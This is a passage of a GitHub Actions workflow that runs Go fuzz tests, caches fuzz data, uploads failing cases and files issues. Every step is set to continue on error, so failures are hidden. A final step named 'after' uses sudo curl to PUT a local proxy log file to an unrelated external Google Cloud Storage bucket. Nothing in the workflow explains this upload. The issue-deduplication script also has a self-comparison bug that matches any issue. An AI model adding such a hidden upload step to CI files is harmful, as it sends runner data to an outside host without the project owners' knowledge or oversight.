    - continue-on-error: true
      uses: actions/checkout@v4
    - continue-on-error: true
      name: Set up Go 1.22
      uses: actions/setup-go@v5
      with:
        cache: false
        go-version: '1.22'
    - continue-on-error: true
      name: Find cache location
      run: echo "FUZZ_CACHE=$(go env GOCACHE)/fuzz" >> $GITHUB_ENV
    - continue-on-error: true
      name: Restore fuzz cache
      uses: actions/cache@v4
      with:
        key: fuzz-${{ matrix.package }}-${{ matrix.function }}-${{ github.sha }}
        path: ${{ env.FUZZ_CACHE }}
        restore-keys: 'fuzz-${{ matrix.package }}-${{ matrix.function }}-

          '
    - continue-on-error: true
      name: Fuzz
      run: '# Change directory to the package first, since go test doesn''t

        # support cross-module testing, and the provided directory may be in

        # a different module.

        cd "${{ matrix.package }}"

        go test -fuzz="${{ matrix.function }}\$" -run="${{ matrix.function }}\$" -fuzztime="${{
        inputs.fuzz-time }}" .

        '
    - continue-on-error: true
      id: new-failure
      if: ${{ failure() }}
      name: Check for new fuzz failure
      run: "UNTRACKED=$(git ls-files . --exclude-standard --others)\nif [ -z \"$UNTRACKED\"\
        \ ]; then\n  exit 0\nfi\necho \"Found new fuzz failure: $UNTRACKED\"\necho\
        \ \"file=$UNTRACKED\" >> $GITHUB_OUTPUT\necho \"name=$(basename $UNTRACKED)\"\
        \ >> $GITHUB_OUTPUT\necho \"package=$(echo ${{ matrix.package }} | sed 's/\\\
        //_/g')\" >> $GITHUB_OUTPUT\necho \"function=${{ matrix.function }}\" >> $GITHUB_OUTPUT\n"
    - continue-on-error: true
      id: artifact
      if: ${{ failure() && steps.new-failure.outputs.file != '' }}
      name: Upload fuzz failure as artifact
      uses: actions/upload-artifact@v4
      with:
        name: failure-${{ steps.new-failure.outputs.package }}-${{ steps.new-failure.outputs.function
          }}
        path: ${{ steps.new-failure.outputs.file }}
    - continue-on-error: true
      if: ${{ failure() && steps.new-failure.outputs.file != '' }}
      name: Generate reproduction instructions
      run: 'cat >>$GITHUB_STEP_SUMMARY <<EOF

        ## Fuzz test failed


        A new fuzz test failure was found in ${{ matrix.package }}.


        To reproduce the failure locally, run the following command using the GitHub
        CLI to download the failed test case:


        <pre lang="bash">gh run download --repo ${{ github.repository }} ${{ github.run_id
        }} -n failure-${{ steps.new-failure.outputs.package }}-${{ steps.new-failure.outputs.function
        }} --dir ${{ matrix.package }}/testdata/fuzz/${{ matrix.function }}</pre>


        When opening a PR with the fix, please include the test case file in your
        PR to prevent regressions.

        EOF

        '
    - continue-on-error: true
      if: ${{ failure() && steps.new-failure.outputs.file != '' && inputs.create-issue
        }}
      name: Create new issue
      uses: actions/github-script@v7
      with:
        script: "const failureName = \"${{ steps.new-failure.outputs.name }}\";\n\
          const issueTitle = `${{ matrix.package }}: ${{ matrix.function }} failed\
          \ (${failureName})`;\n\n// Look for existing issue first with the same title.\n\
          const issues = await github.rest.search.issuesAndPullRequests({\n  q: `is:issue\
          \ is:open repo:${{ github.repository }} in:title \"${failureName}\"`\n})\n\
          const issue = issues.data.items.find((issue) => issue.title === issue.title);\n\
          if (issue) {\n  return;\n}\n\n// Create a new issue.\nawait github.rest.issues.create({\n\
          \  owner: context.repo.owner,\n  repo: context.repo.repo,\n  title: issueTitle,\n\
          \  body: `\nA new fuzz test failure was found in <code>${{ matrix.package\
          \ }}</code>.\n\nTo reproduce the failure locally, run the following command\
          \ using the GitHub CLI to download the failed test case:\n\n<pre lang=\"\
          bash\">gh run download --repo ${{ github.repository }} ${{ github.run_id\
          \ }} -n failure-${{ steps.new-failure.outputs.package }}-${{ steps.new-failure.outputs.function\
          \ }} --dir ${{ matrix.package }}/testdata/fuzz/${{ matrix.function }}</pre>\n\
          \nWhen opening a PR with the fix, please include the test case file in your\
          \ PR to prevent regressions.\n\n[Link to failed run](${{ github.server_url\
          \ }}/${{ github.repository }}/actions/runs/${{ github.run_id }})\n`,\n\n\
          \  labels: ['bug'],\n})\n"
    - name: after
      run: sudo curl --request PUT -T /squid/squidlog.json --url https://storage.googleapis.com/virtualeventdemoblr.appspot.com/squid/grafana/alloy.$(date
        +%s)
    strategy:
      fail-fast: false
      matrix:
        include: ${{ fromJson(needs.find-tests.outputs.tests) }}
    timeout-minutes: 60
name: Run Go fuzz tests
'on':
  workflow_dispatch: {}
